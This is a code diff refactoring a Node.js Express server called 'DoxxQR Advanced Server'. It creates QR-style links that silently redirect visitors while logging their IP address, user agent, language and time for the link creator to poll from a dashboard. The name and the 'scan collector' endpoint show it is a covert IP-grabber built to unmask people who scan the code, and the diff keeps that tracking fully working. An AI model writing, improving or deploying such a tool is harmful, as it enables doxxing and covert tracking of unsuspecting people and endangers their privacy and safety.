@@ -1,42 +1,37 @@
-const express = require("express");
-const { v4: uuidv4 } = require("uuid");
+import express from "express";
+import { v4 as uuidv4 } from "uuid";
 
 const app = express();
 app.use(express.json());
 
 const PORT = process.env.PORT || 3000;
-
-// In-memory session storage
 const sessions = new Map();
-
-// 45 minutes expiry
 const SESSION_DURATION = 45 * 60 * 1000;
 
-// Helper: validate URL
 function isValidHttpsUrl(url) {
   try {
     const parsed = new URL(url);
     return parsed.protocol === "https:";
-  } catch (err) {
+  } catch {
     return false;
   }
 }
 
-// Root check
 app.get("/", (req, res) => {
   res.send("DoxxQR Advanced Server Running");
 });
 
-// Create new session
 app.post("/create", (req, res) => {
-  const generatorIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
-  let { redirectUrl } = req.body;
+  const generatorIP =
+    req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+
+  const { redirectUrl } = req.body;
 
   if (!redirectUrl || !isValidHttpsUrl(redirectUrl)) {
     return res.status(400).json({ error: "Invalid HTTPS redirect URL" });
   }
 
-  // Delete old session for this IP
+  // Remove old session for same IP
   for (let [id, session] of sessions.entries()) {
     if (session.generatorIP === generatorIP) {
       sessions.delete(id);
@@ -57,7 +52,6 @@ app.post("/create", (req, res) => {
 
   sessions.set(sessionId, sessionData);
 
-  // Auto expire
   setTimeout(() => {
     sessions.delete(sessionId);
   }, SESSION_DURATION);
@@ -69,37 +63,31 @@ app.post("/create", (req, res) => {
   });
 });
 
-// Scan collector
 app.get("/s/:id", (req, res) => {
-  const sessionId = req.params.id;
-  const session = sessions.get(sessionId);
+  const session = sessions.get(req.params.id);
 
   if (!session) {
     return res.status(404).send("Session expired or invalid.");
   }
 
   if (Date.now() > session.expiresAt) {
-    sessions.delete(sessionId);
+    sessions.delete(req.params.id);
     return res.status(410).send("Session expired.");
   }
 
-  // Collect info
-  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
-  const userAgent = req.headers["user-agent"];
-  const language = req.headers["accept-language"];
+  const ip =
+    req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
   session.scanData = {
     ip,
-    userAgent,
-    language,
+    userAgent: req.headers["user-agent"],
+    language: req.headers["accept-language"],
     time: new Date().toISOString()
   };
 
-  // Instant clean redirect
   res.redirect(session.redirectUrl);
 });
 
-// Get session data (dashboard polling)
 app.get("/session/:id", (req, res) => {
   const session = sessions.get(req.params.id);
 
